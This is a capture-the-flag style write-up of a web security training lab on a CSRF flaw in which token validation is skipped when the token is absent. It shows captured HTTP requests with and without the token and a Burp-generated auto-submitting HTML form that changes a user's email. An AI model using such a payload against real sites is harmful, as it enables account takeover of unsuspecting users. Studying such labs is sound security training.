# Lab: CSRF where token validation depends on token being present

- I can see a `email changing` functionality.

![](Vulnerabilities/CSRF/img/lab-3-1.png)

- But there is a defense mechanism for `CSRF` that is using a `CSRF` token.

```
POST /my-account/change-email HTTP/1.1
Host: ac5c1fc61e4f8f96c071567f00fd005e.web-security-academy.net
Cookie: session=os82B8DXQYh1hAsEelTD9Nmd8Ez1bwKJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://ac5c1fc61e4f8f96c071567f00fd005e.web-security-academy.net
Referer: https://ac5c1fc61e4f8f96c071567f00fd005e.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

email=test%40test.com&csrf=Tz4NMBVlik25M8idDFuZDc4KyJUwo87o
```

- When I completely remove the `csrf` parameter, I can bypass the protection mechanism.

```
POST /my-account/change-email HTTP/1.1
Host: ac5c1fc61e4f8f96c071567f00fd005e.web-security-academy.net
Cookie: session=os82B8DXQYh1hAsEelTD9Nmd8Ez1bwKJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: https://ac5c1fc61e4f8f96c071567f00fd005e.web-security-academy.net
Referer: https://ac5c1fc61e4f8f96c071567f00fd005e.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

email=test1%40test.com
```

```
HTTP/1.1 302 Found
Location: /my-account
Connection: close
Content-Length: 0
```

- Exploit `html` - 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac5c1fc61e4f8f96c071567f00fd005e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

